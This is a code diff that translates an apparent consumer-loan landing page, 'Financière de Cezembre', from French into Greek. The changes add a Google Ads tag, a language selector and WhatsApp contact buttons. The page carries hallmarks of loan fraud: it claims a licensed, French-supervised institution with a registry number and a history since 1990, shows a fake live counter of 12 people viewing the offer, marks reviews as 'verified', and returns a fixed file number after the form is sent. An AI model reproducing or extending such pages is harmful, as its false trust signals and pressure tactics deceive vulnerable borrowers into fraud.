@@ -1,9 +1,17 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="el">
 <head>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-18121475138"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'AW-18121475138', {'send_page_view': false});
+    </script>
+
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FINANCIÈRE DE CEZEMBRE | Solutions de Crédit Institutionnelles</title>
+    <title>Πίστις Προχρηματοδότηση | Θεσμικές Πιστωτικές Λύσεις</title>
     
     <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='%23001A4D'/><text y='70' x='15' font-family='serif' font-size='55' font-weight='bold' fill='%23C5A059'>FC</text></svg>">
 
@@ -13,6 +21,7 @@
     <style>
         :root {
             --navy: #001A4D;
+            --navy-light: #003399;
             --gold: #C5A059;
             --bright-gold: #FFD700; 
             --deep-gold: #E6B800; 
@@ -22,10 +31,138 @@
             --success: #27ae60;
         }
 
-        /* Masquer la barre de traduction Google en haut pour garder le design propre */
-        .goog-te-banner-frame.skiptranslate, .goog-te-gadget-icon { display: none !important; }
+        .goog-te-banner-frame.skiptranslate { display: none !important; }
         body { top: 0px !important; }
-        .goog-te-gadget-simple { background-color: transparent !important; border: none !important; }
+        #google_translate_element { display: none; }
+        .goog-te-gadget { display: none !important; }
+
+        .nav-container-separated {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .nav-cage {
+            background-color: var(--navy);
+            padding: 10px 20px;
+            border-radius: 6px;
+            border: 1px solid var(--gold);
+            color: var(--white) !important;
+            text-decoration: none;
+            font-size: 0.8rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            display: inline-block;
+            text-align: center;
+            min-width: 110px;
+        }
+
+        .nav-cage:hover {
+            background-color: var(--navy-light);
+            color: var(--bright-gold) !important;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+        }
+
+        .btn-home {
+            background-color: #f8f9fa;
+            color: var(--navy) !important;
+            border: 1.5px solid var(--gold);
+            padding: 10px 15px;
+            border-radius: 6px;
+            font-weight: 800;
+            font-size: 0.75rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-decoration: none;
+            transition: 0.3s;
+        }
+
+        .btn-home:hover {
+            background-color: var(--gold);
+            color: white !important;
+        }
+
+        .mobile-return-btn {
+            position: fixed;
+            bottom: 100px;
+            right: 20px;
+            background: var(--navy);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 0.8rem;
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            border: 1px solid var(--gold);
+            text-decoration: none;
+            transition: 0.3s;
+        }
+
+        .country-selector {
+            position: relative;
+            display: inline-block;
+            font-family: 'Montserrat', sans-serif;
+        }
+        .selected-country {
+            border: 1.5px solid var(--gold);
+            padding: 6px 14px;
+            background: #fdfaf3;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            color: var(--navy);
+            min-width: 160px;
+            border-radius: 4px;
+            transition: all 0.3s ease;
+            box-shadow: 0 2px 5px rgba(197, 160, 89, 0.15);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .selected-country:hover {
+            background: var(--white);
+            box-shadow: 0 4px 8px rgba(197, 160, 89, 0.25);
+        }
+        .country-dropdown {
+            display: none;
+            position: absolute;
+            top: 110%;
+            right: 0;
+            background: white;
+            border: 1px solid var(--gold);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+            z-index: 2000;
+            width: 100%;
+            min-width: 180px;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        .country-dropdown div {
+            padding: 10px 15px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.75rem;
+            color: var(--navy);
+            transition: background 0.2s;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        .country-dropdown div:last-child { border-bottom: none; }
+        .country-dropdown div:hover { background: #fdfaf3; color: var(--gold); }
+        .flag { width: 20px; height: 14px; object-fit: cover; border-radius: 2px; }
+        .show-countries { display: block; }
 
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
         
@@ -38,7 +175,7 @@
         }
 
         header {
-            background: var(--white); padding: 20px 8%; display: flex;
+            background: var(--white); padding: 15px 8%; display: flex;
             justify-content: space-between; align-items: center;
             position: fixed; width: 100%; z-index: 1000; box-shadow: 0 4px 12px rgba(0,0,0,0.05);
         }
@@ -50,20 +187,14 @@
             font-weight: 700; font-family: serif; border-radius: 4px; font-size: 1.1rem;
             border: 1px solid var(--gold); flex-shrink: 0;
         }
-        .logo { font-weight: 700; font-size: 1.4rem; color: var(--navy); letter-spacing: -1px; }
+        .logo { font-weight: 700; font-size: 1.2rem; color: var(--navy); letter-spacing: -1px; }
         
-        .nav-links { display: flex; gap: 30px; align-items: center; }
-        .nav-links a { text-decoration: none; color: #666; font-size: 0.9rem; font-weight: 500; transition: 0.3s; cursor: pointer; }
-        .nav-links a:hover { color: var(--gold); text-shadow: 0 0 8px rgba(197, 160, 89, 0.4); }
+        .header-msg { font-size: 0.7rem; color: var(--navy); font-weight: 600; margin-top: 2px; }
 
-        .intl-badge {
-            font-size: 0.7rem; font-weight: 700; color: var(--gold); 
-            border: 1px solid var(--gold); padding: 5px 10px;
-            display: flex; align-items: center; gap: 8px;
-        }
+        .nav-links { display: flex; gap: 20px; align-items: center; }
 
         .hero {
-            height: 100vh; background: linear-gradient(rgba(0,26,77,0.7), rgba(0,26,77,0.7)), 
+            min-height: 100vh; background: linear-gradient(rgba(0,26,77,0.7), rgba(0,26,77,0.7)), 
             url('https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&q=80&w=2000');
             background-size: cover; background-position: center;
             display: flex; align-items: center; padding: 0 8%; color: var(--white);
@@ -80,36 +211,106 @@
         .hero-content h1 { font-size: 3.5rem; line-height: 1.2; margin-bottom: 20px; }
         
         .simulator { 
-            background: var(--white); padding: 40px; border-radius: 2px; width: 480px; 
+            background: var(--white); padding: 30px 40px; border-radius: 2px; width: 480px; 
             box-shadow: 0 30px 60px rgba(0,0,0,0.4); color: var(--navy); 
-            position: relative; overflow: hidden; min-height: 520px;
+            position: relative; overflow: hidden; min-height: 480px;
         }
 
-        /* --- RÉGLAGES MOBILE SPÉCIFIQUE --- */
+        .btn-group-flex {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+            width: 100%;
+        }
+        .btn-wa-inline {
+            background: var(--whatsapp);
+            color: white;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 1.4rem;
+            transition: 0.3s;
+            width: 55px; 
+            flex-shrink: 0;
+        }
+        .btn-wa-inline:hover { background: #128C7E; transform: scale(1.05); }
+
         @media (max-width: 991px) {
-            .hero { flex-direction: column; height: auto; padding: 120px 5% 50px; text-align: center; }
-            .hero-content { max-width: 100%; margin-bottom: 40px; }
-            .hero-content h1 { font-size: 2.2rem; }
-            .simulator { width: 100%; max-width: 480px; padding: 25px; }
+            header { padding: 10px 3%; flex-direction: column; gap: 10px; height: auto; position: relative; }
+            .logo { font-size: 1rem; }
+            .nav-links { 
+                display: grid; 
+                grid-template-columns: 1fr 1fr; 
+                gap: 8px; 
+                width: 100%; 
+                margin-top: 5px;
+            }
+            .nav-container-separated { 
+                display: contents; 
+            }
+            .nav-cage, .btn-home { 
+                width: 100%; 
+                min-width: auto; 
+                font-size: 0.65rem; 
+                padding: 12px 5px; 
+                margin: 0;
+            }
+            .country-selector { grid-column: span 2; width: 100%; }
+            .selected-country { width: 100%; justify-content: center; }
+
+            .mobile-return-btn { display: flex; } 
+            
+            .hero { 
+                flex-direction: column; 
+                height: auto; 
+                padding: 40px 5% 40px 5%; 
+                text-align: center;
+                display: flex;
+                align-items: center;
+                justify-content: flex-start;
+            }
+            
+            .hero-content { 
+                max-width: 100%; 
+                margin-bottom: 30px; 
+                background: none; 
+            }
+            
+            .hero-content h1 { font-size: 1.8rem; line-height: 1.3; }
+            
+            .simulator { 
+                width: 95%; 
+                max-width: 420px; 
+                padding: 20px; 
+                min-height: auto; 
+                margin: 0 auto; 
+                position: relative;
+                left: 0; 
+            }
+
             .stats-bar { flex-direction: column; gap: 30px; }
             .f-grid, .legal-block { margin-left: 0 !important; text-align: center; }
             .f-grid { grid-template-columns: 1fr; }
-            .reviews-grid { grid-template-columns: 1fr !important; padding: 20px !important; }
-
-            /* ZONE DE RESPIRATION EN BAS POUR MOBILE */
-            footer { padding-bottom: 160px !important; } 
+            .reviews-grid { grid-template-columns: 1fr !important; padding: 10px !important; }
+            footer { padding-bottom: 100px !important; } 
             
-            /* BOUTON WHATSAPP PLUS PETIT SUR MOBILE */
-            .wa-assistant-container { bottom: 15px; left: 15px; }
-            .wa-msg-bubble { font-size: 0.6rem; padding: 5px 10px; margin-bottom: 10px; }
-            .whatsapp-float-dynamic { width: 52px; height: 52px; font-size: 28px; }
+            .live-btn { 
+                width: 100% !important; 
+                max-width: 100% !important; 
+                height: auto !important; 
+                padding: 8px 10px !important; 
+                white-space: normal !important; 
+                text-align: center; 
+                line-height: 1.2; 
+            }
         }
 
-        /* --- SECTION TÉMOIGNAGES --- */
         .reviews-section { padding: 80px 8%; background: var(--light-bg); text-align: center; }
         .reviews-section h2 { color: var(--navy); margin-bottom: 20px; font-size: 2rem; }
         
-        /* STYLE DU BADGE DE CONFIANCE [ ★ ★ ★ 🔒 ★ ★ ★ ] */
         .trust-badge-container {
             display: inline-flex; align-items: center; justify-content: center;
             background: white; padding: 12px 30px; border-radius: 50px;
@@ -126,31 +327,46 @@
             50% { transform: scale(1.15); opacity: 0.8; }
         }
 
-        .reviews-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px; }
-        
-        /* AJOUT DE L'EFFET DYNAMIQUE SUR LES CARTES (SANS MOUVEMENT GLOBAL) */
-        .review-card { 
-            background: white; 
-            padding: 25px; 
-            border-radius: 8px; 
-            box-shadow: 0 10px 20px rgba(0,0,0,0.05); 
-            text-align: left; 
-            border-top: 3px solid var(--gold);
-            transition: all 0.4s ease; /* Fluidité du survol */
+        .reviews-grid { 
+            display: flex; 
+            flex-direction: column-reverse; 
+            gap: 20px; 
+            max-width: 800px; 
+            margin: 0 auto;
+            min-height: 600px;
+            overflow: hidden;
+            padding: 20px;
         }
-        .review-card:hover { 
-            transform: translateY(-5px); /* Monte légèrement au survol */
-            box-shadow: 0 15px 30px rgba(197, 160, 89, 0.2); /* Ombre dorée */
+        
+        .review-card { 
+            background: white; padding: 20px; border-radius: 8px; 
+            box-shadow: 0 10px 20px rgba(0,0,0,0.05); text-align: left; 
+            border-left: 5px solid var(--gold);
+            display: flex;
+            gap: 15px;
+            align-items: flex-start;
+            animation: dropReview 0.8s cubic-bezier(0.24, 1, 0.32, 1) forwards;
+        }
+
+        @keyframes dropReview {
+            0% { opacity: 0; transform: translateY(-100px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        .author-img {
+            width: 60px; height: 60px; border-radius: 50%; object-fit: cover;
+            border: 2px solid var(--gold); flex-shrink: 0;
         }
 
         .stars { color: var(--bright-gold); margin-bottom: 5px; font-size: 0.9rem; }
-        .review-date { font-size: 0.7rem; color: #999; margin-bottom: 10px; font-weight: 600; display: block; }
-        .review-text { font-style: italic; font-size: 0.9rem; color: #555; margin-bottom: 15px; line-height: 1.6; min-height: 60px; }
-        .review-author { font-weight: 700; color: var(--navy); font-size: 0.85rem; display: flex; align-items: center; justify-content: space-between; }
+        .review-date { font-size: 0.7rem; color: #999; margin-bottom: 10px; font-weight: 600; display: flex; align-items: center; gap: 5px; }
+        .review-date i { color: var(--success); }
+        .review-text { font-style: italic; font-size: 0.9rem; color: #555; margin-bottom: 15px; line-height: 1.6; }
+        .review-author { font-weight: 700; color: var(--navy); font-size: 0.85rem; display: flex; align-items: center; justify-content: space-between; width: 100%;}
         .verified { color: var(--success); font-size: 0.7rem; text-transform: uppercase; font-weight: 800; }
 
-        .sim-row { margin-bottom: 20px; }
-        .sim-row label { display: flex; justify-content: space-between; font-weight: 600; margin-bottom: 10px; font-size: 0.9rem; }
+        .sim-row { margin-bottom: 15px; }
+        .sim-row label { display: flex; justify-content: space-between; font-weight: 600; margin-bottom: 8px; font-size: 0.85rem; }
         .sim-row label span { color: var(--navy); font-weight: 800; } 
         
         input[type="range"] { 
@@ -159,51 +375,33 @@
             background-repeat: no-repeat; background-size: 0% 100%;
         }
         input[type="range"]::-webkit-slider-thumb { 
-            -webkit-appearance: none; height: 22px; width: 22px; border-radius: 50%; 
-            background: var(--navy); 
-            cursor: pointer; border: 2px solid white; box-shadow: 0 0 5px rgba(0,0,0,0.3);
-        }
-        input[type="range"]::-moz-range-thumb { 
-            height: 22px; width: 22px; border-radius: 50%; background: var(--navy); cursor: pointer; border: 2px solid white; 
+            -webkit-appearance: none; height: 20px; width: 20px; border-radius: 50%; 
+            background: var(--navy); cursor: pointer; border: 2px solid white; box-shadow: 0 0 5px rgba(0,0,0,0.3);
         }
         
-        .result-area { background: var(--light-bg); padding: 25px; text-align: center; border: 1px solid #EEE; margin-bottom: 20px; border-radius: 4px; }
+        .result-area { background: var(--light-bg); padding: 15px; text-align: center; border: 1px solid #EEE; margin-bottom: 15px; border-radius: 4px; }
+        .result-area p { font-size: 0.75rem; margin-bottom: 2px; color: var(--navy); font-weight: 700; opacity: 0.8; }
+        .result-area span { font-size: 1.8rem; font-weight: 800; color: var(--navy); }
         
-        .result-area p { 
-            font-size: 0.9rem; 
-            margin-bottom: 5px; 
-            color: var(--navy); 
-            font-weight: 800;
-            text-shadow: 1px 2px 3px rgba(0,0,0,0.1);
-            animation: blink-soft 3s infinite;
-        }
-        @keyframes blink-soft {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.8; }
-        }
-        .result-area span { font-size: 2.2rem; font-weight: 800; color: var(--navy); }
-        
-        .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; cursor: pointer; transition: 0.3s; }
-        .btn-main:hover { background: var(--gold); }
+        .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 15px; font-weight: 800; font-size: 1rem; cursor: pointer; transition: 0.3s; border-radius: 4px; }
+        .btn-main:hover { background: var(--gold); transform: scale(1.02); }
 
         .form-input { 
-            width: 100%; 
-            padding: 12px; 
-            border: 2.5px solid var(--deep-gold); 
-            background-color: var(--white);
-            border-radius: 4px; 
-            margin-bottom: 10px; 
-            font-size: 1rem;
-            outline: none;
-            color: #000c24; 
-            font-weight: 600; 
+            width: 100%; padding: 12px; border: 2.5px solid var(--deep-gold); 
+            background-color: var(--white); border-radius: 4px; margin-bottom: 10px; 
+            font-size: 1rem; outline: none; color: #000c24; font-weight: 600; 
         }
-        .form-input:focus { border-color: var(--navy); background-color: #fffef0; }
 
-        .security-tag { text-align: center; margin-top: 15px; font-size: 0.7rem; color: #27ae60; font-weight: 600; text-transform: uppercase; }
+        .secure-form-badge {
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+            margin-top: 15px; padding: 10px; background: #f8f9fa; border-radius: 4px;
+            border: 1px dashed var(--gold);
+        }
+        .secure-form-badge i { color: var(--success); font-size: 1.2rem; }
+        .secure-form-badge p { font-size: 0.65rem; color: #666; line-height: 1.2; text-align: left; font-weight: 500; }
 
         .scrolling-security {
-            background: #f0f4f8; color: #004085; font-size: 0.7rem; padding: 8px 0; margin: 10px 0;
+            background: #f0f4f8; color: #004085; font-size: 0.7rem; padding: 6px 0; margin: 10px 0;
             overflow: hidden; white-space: nowrap; border-top: 1px solid #d1ecf1; border-bottom: 1px solid #d1ecf1;
             display: flex;
         }
@@ -219,11 +417,8 @@
             display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
             background: white; z-index: 100; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px;
         }
-        .spinner { width: 60px; height: 60px; border: 5px solid #f3f3f3; border-top: 5px solid var(--navy); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--navy); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        #success-message { display: none; text-align: center; }
-        #success-message i { color: var(--success); font-size: 4rem; margin-bottom: 20px; }
 
         .stats-bar { background: var(--navy); padding: 40px 8%; display: flex; justify-content: space-around; color: white; text-align: center; }
         .stat-box h3 { font-size: 2rem; color: var(--gold); }
@@ -241,59 +436,103 @@
         @keyframes pulse-text { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
 
         .wa-assistant-container { position: fixed; bottom: 30px; left: 30px; z-index: 9999; display: flex; flex-direction: column; align-items: center; }
+        .whatsapp-float-dynamic { background-color: var(--whatsapp); color: #FFF; width: 65px; height: 65px; border-radius: 50%; text-align: center; font-size: 35px; box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); display: flex; align-items: center; justify-content: center; text-decoration: none; position: relative; animation: magnet-pulse 2s infinite ease-in-out; }
         
-        .wa-msg-bubble { background: var(--navy); color: white; padding: 10px 15px; border-radius: 12px; font-size: 0.75rem; font-weight: 600; margin-bottom: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); border: 1px solid var(--gold); position: relative; animation: fadeInOut 4s infinite; white-space: nowrap; }
-        .wa-msg-bubble::after { content: ''; position: absolute; bottom: -8px; left: 50%; transform: translateX(-50%); border-left: 8px solid transparent; border-right: 8px solid transparent; border-top: 8px solid var(--navy); }
-        
-        .whatsapp-float-dynamic { 
-            background-color: var(--whatsapp); 
-            color: #FFF; width: 65px; height: 65px; border-radius: 50%; 
-            text-align: center; font-size: 35px; box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); 
-            display: flex; align-items: center; justify-content: center; 
-            text-decoration: none; position: relative; 
-            animation: magnet-pulse 2s infinite ease-in-out; 
-        }
-
-        @keyframes magnet-pulse {
-            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); }
-            10% { transform: scale(1.1) rotate(5deg); }
-            20% { transform: scale(1.1) rotate(-5deg); }
-            30% { transform: scale(1.1) rotate(5deg); }
-            40% { transform: scale(1) rotate(0deg); }
-            70% { box-shadow: 0 0 0 20px rgba(37, 211, 102, 0); }
-            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(37, 211, 102, 0); }
-        }
-
-        @keyframes fadeInOut { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.8; transform: scale(0.95); } }
+        @keyframes magnet-pulse { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); } 10% { transform: scale(1.1) rotate(5deg); } 20% { transform: scale(1.1) rotate(-5deg); } 30% { transform: scale(1.1) rotate(5deg); } 40% { transform: scale(1) rotate(0deg); } 70% { box-shadow: 0 0 0 20px rgba(37, 211, 102, 0); } 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(37, 211, 102, 0); } }
         
         #goUp { position: fixed; bottom: 30px; right: 30px; background: var(--gold); color: white; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; display: none; }
+        
+        .live-btn { 
+            background: rgba(39, 174, 96, 0.1); 
+            border: 1px solid var(--success);
+            color: var(--success);
+            padding: 8px 15px;
+            border-radius: 50px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
+            min-height: 35px;
+        }
+        .dot-live { width: 8px; height: 8px; background: var(--success); border-radius: 50%; animation: blink-dot 1s infinite; flex-shrink: 0; }
+        @keyframes blink-dot { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(1.2); } 100% { opacity: 1; transform: scale(1); } }
+
+        .solutions-slider { padding: 60px 8%; background: white; overflow: hidden; }
+        .slider-title { text-align: center; color: var(--navy); margin-bottom: 40px; font-size: 2rem; }
+        .slider-track { display: flex; gap: 30px; animation: slideTrack 25s linear infinite; width: calc(350px * 6 + 180px); }
+        @keyframes slideTrack { 0% { transform: translateX(0); } 100% { transform: translateX(calc(-350px * 3 - 90px)); } }
+        .solution-card { width: 350px; background: var(--light-bg); border-radius: 12px; overflow: hidden; box-shadow: 0 10px 20px rgba(0,0,0,0.08); border: 1px solid #eee; flex-shrink: 0; transition: 0.3s; }
+        .solution-card:hover { transform: translateY(-10px); border-color: var(--gold); }
+        .solution-img { width: 100%; height: 220px; object-fit: cover; }
+        .solution-info { padding: 20px; text-align: center; }
+        .btn-detail { background: var(--navy); color: white; border: none; padding: 10px 20px; border-radius: 4px; font-weight: 700; cursor: pointer; transition: 0.3s; width: 100%; }
+        .btn-detail:hover { background: var(--gold); }
+        
+        #modal-overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); display:none; justify-content:center; align-items:center; z-index:10000; padding:20px; }
+        .modal-content { background:white; padding:40px; border-radius:8px; max-width:600px; position:relative; text-align:center; border-top: 5px solid var(--gold); }
+        .modal-close { position:absolute; top:15px; right:15px; font-size:1.5rem; cursor:pointer; color: var(--navy); }
+        .modal-content h3 { color: var(--navy); margin-bottom: 20px; font-size: 1.8rem; }
+        .modal-content p { line-height: 1.8; color: #555; }
     </style>
 </head>
 <body>
 
+<div id="google_translate_element"></div>
+
+<a href="#" onclick="window.scrollTo({top:0, behavior:'smooth'})" class="mobile-return-btn" id="mobileReturn">
+    <i class="fas fa-arrow-left"></i> ΕΠΙΣΤΡΟΦΗ
+</a>
+
 <header>
     <div class="logo-container">
-        <div class="logo-sigle">FC</div>
-        <div class="logo">FINANCIÈRE DE CEZEMBRE</div>
+        <div>
+            <div style="display:flex; align-items:center; gap:10px;">
+                <div class="logo-sigle">FC</div>
+                <div class="logo">ΠΙΣΤΙΣ ΠΡΟΧΡΗΜΑΤΟΔΟΤΗΣΗ</div>
+            </div>
+            <div class="header-msg">Άμεση πίστωση – Υποβάλετε μια αίτηση express και λάβετε άμεση απάντηση*</div>
+        </div>
     </div>
+    
     <div class="nav-links">
-        <a href="#about">Notre Expertise</a>
-        <a href="#legal">Gouvernance</a>
-        <a onclick="goToStep1()" href="#simBox">Contact</a>
-        <div id="google_translate_element" style="display:none;"></div>
-        <div class="intl-badge"><i class="fas fa-globe"></i> PORTAIL INTERNATIONAL SÉCURISÉ</div>
+        <a href="#" onclick="window.scrollTo({top:0, behavior:'smooth'})" class="btn-home">
+            <i class="fas fa-home"></i> ΑΡΧΙΚΗ
+        </a>
+
+        <div class="nav-container-separated">
+            <a href="#about" class="nav-cage">Εμπειρία</a>
+            <a href="#legal" class="nav-cage">Διακυβέρνηση</a>
+            <a onclick="goToStep1()" href="#simBox" class="nav-cage">Επικοινωνία</a>
+        </div>
+        
+        <div class="country-selector">
+            <div class="selected-country" onclick="toggleDropdown()">
+                <img src="https://flagcdn.com/w40/gr.png" class="flag" id="current-flag">
+                <span id="current-name">ΕΛΛΗΝΙΚΑ</span>
+                <i class="fas fa-chevron-down" style="font-size: 0.7rem; margin-left: auto; color: var(--gold);"></i>
+            </div>
+            <div class="country-dropdown" id="country-list">
+                <div onclick="selectLanguage('Français', 'fr')"><img src="https://flagcdn.com/w40/fr.png" class="flag"> Français</div>
+                <div onclick="selectLanguage('Greek', 'gr')"><img src="https://flagcdn.com/w40/gr.png" class="flag"> Ελληνικά</div>
+                <div onclick="selectLanguage('English', 'gb')"><img src="https://flagcdn.com/w40/gb.png" class="flag"> English</div>
+                <div onclick="selectLanguage('Deutsch', 'de')"><img src="https://flagcdn.com/w40/de.png" class="flag"> Deutsch</div>
+                <div onclick="selectLanguage('Norsk', 'no')"><img src="https://flagcdn.com/w40/no.png" class="flag"> Norsk</div>
+            </div>
+        </div>
     </div>
 </header>
 
 <div class="wa-assistant-container">
-    <div class="wa-msg-bubble"><span id="wa-text">Besoin d'aide ? Contactez l'assistance</span></div>
     <a href="https://wa.me/33780976404" class="whatsapp-float-dynamic" target="_blank"><i class="fab fa-whatsapp"></i></a>
 </div>
 
 <section class="hero">
     <div class="hero-content">
-        <h1>L'excellence financière <br>au service de vos projets.</h1>
-        <p style="margin-bottom: 30px; opacity: 0.9;">Partenaire de confiance depuis 1990. Distribution de crédit institutionnel régulé.</p>
+        <h1>Οικονομική Αριστεία <br>για τα έργα σας.</h1>
+        <p style="margin-bottom: 30px; opacity: 0.9;">Αξιόπιστος συνεργάτης από το 1990. Ρυθμιζόμενος θεσμικός δανεισμός.</p>
         
         <div style="display: flex; gap: 20px; align-items: center;">
             <div style="position: relative; display: flex; align-items: center; justify-content: center;">
@@ -301,9 +540,9 @@
                 <i class="fas fa-check" style="color: var(--navy); position: absolute; font-size: 1.2rem; font-weight: 900;"></i>
             </div>
             <p>
-                <strong style="color: #FFD700; font-size: 0.9rem; letter-spacing: 1px;">ÉTABLISSEMENT AGRÉÉ</strong><br>
-                <strong>Société immatriculée au RCS 552 058 943</strong><br>
-                Sous la supervision des autorités bancaires françaises.
+                <strong style="color: #FFD700; font-size: 0.9rem; letter-spacing: 1px;">ΕΓΚΕΚΡΙΜΕΝΟ ΙΔΡΥΜΑ</strong><br>
+                <strong>Εγγεγραμμένο στο RCS 552 058 943</strong><br>
+                Υπό την εποπτεία των γαλλικών τραπεζικών αρχών.
             </p>
         </div>
     </div>
@@ -312,215 +551,319 @@
         <div id="loader-overlay">
             <div id="loading-content">
                 <div class="spinner"></div>
-                <p id="loader-text" style="font-weight: 600; color: var(--navy);">Analyse du dossier en cours...</p>
-                <p style="font-size: 0.7rem; color: #999; margin-top: 10px;">Vérification des bases de données ACPR</p>
+                <p id="loader-text" style="font-weight: 600; color: var(--navy);">Ανάλυση σε εξέλιξη...</p>
             </div>
             <div id="success-message">
-                <i class="fas fa-check-circle"></i>
-                <h3 style="color: var(--navy); margin-bottom: 10px;">DEMANDE ENREGISTRÉE</h3>
-                <p style="font-size: 0.9rem; margin-bottom: 20px;">Votre numéro de dossier : <strong>#CEZ-2026</strong> a été transmis avec succès.</p>
+                <i class="fas fa-check-circle" style="color:var(--success); font-size:3rem;"></i>
+                <h3 style="color: var(--navy); margin: 10px 0;">Η ΑΙΤΗΣΗ ΑΠΟΘΗΚΕΥΤΗΚΕ</h3>
+                <p style="font-size: 0.85rem; margin-bottom: 15px;">Αριθμός φακέλου: #CEZ-2026</p>
                 <button class="btn-main" onclick="resetAll()">OK</button>
             </div>
         </div>
 
         <div id="step1">
-            <h3 style="margin-bottom: 30px;">Simulateur de Crédit</h3>
+            <div class="live-btn"><div class="dot-live"></div> <span id="viewers-count">12</span> άτομα βλέπουν αυτήν την προσφορά τώρα</div>
+            
+            <h3 style="margin-bottom: 15px; font-size: 1.1rem;">Υπολογιστής Δανείου</h3>
             <div class="sim-row">
-                <label>MONTANT DU PROJET <span><input type="number" id="amtNum" value="15000" style="border:none; text-align:right; font-weight:800; width:80px; background:transparent; color: var(--navy);"> €</span></label>
+                <label>ΠΟΣΟ ΕΡΓΟΥ <span><input type="number" id="amtNum" value="15000" style="border:none; text-align:right; font-weight:800; width:70px; background:transparent; color: var(--navy); font-size:0.9rem;"> €</span></label>
                 <input type="range" id="amtRange" min="1000" max="75000" step="500" value="15000">
             </div>
             <div class="sim-row">
-                <label>DURÉE DU REMBOURSEMENT <span id="durText" style="color: var(--navy); font-weight: 800;">36 mois</span></label>
+                <label>ΔΙΑΡΚΕΙΑ <span id="durText" style="color: var(--navy); font-weight: 800;">36 Μήνες</span></label>
                 <input type="range" id="durRange" min="6" max="84" step="6" value="36">
             </div>
             <div class="result-area">
-                <p>MENSUALITÉ ESTIMÉE (TAEG FIXE 3.5%)</p>
-                <span id="monthlyRes">0.00</span> <span style="color: var(--navy); font-weight: 800;">€</span>
-            </div>
-            <button type="button" class="btn-main" onclick="goToStep2()">DÉPOSER MON DOSSIER</button>
-            
-            <div class="scrolling-security">
-                <span><i class="fas fa-lock" style="color:var(--gold);"></i> CONFIDENTIALITÉ : Vos données sont strictement confidentielles et ne seront jamais vendues à des tiers. • Transfert sécurisé SSL 256-bit • Protection garantie.</span>
+                <p>ΕΚΤΙΜΩΜΕΝΗ ΜΗΝΙΑΙΑ ΔΟΣΗ (3.5% ΣΤΑΘΕΡΟ)</p>
+                <span id="monthlyRes">0.00</span> <span style="color: var(--navy); font-weight: 800; font-size: 1.4rem;">€</span>
             </div>
 
-            <div class="security-tag"><i class="fas fa-lock"></i> VOTRE DOSSIER EST 100% SÉCURISÉ</div>
+            <div class="btn-group-flex">
+                <button type="button" class="btn-main" onclick="goToStep2()">ΥΠΟΒΟΛΗ ΑΙΤΗΣΗΣ</button>
+                <a href="https://wa.me/33780976404?text=Γεια%20σας,%20ενδιαφέρομαι%20για%20ένα%20δάνειο." class="btn-wa-inline" target="_blank">
+                    <i class="fab fa-whatsapp"></i>
+                </a>
+            </div>
+            
+            <div class="scrolling-security">
+                <span><i class="fas fa-lock" style="color:var(--gold);"></i> Κρυπτογράφηση SSL 256-Bit • Εγγυημένη προστασία • Τα δεδομένα σας είναι άκρως εμπιστευτικά.</span>
+            </div>
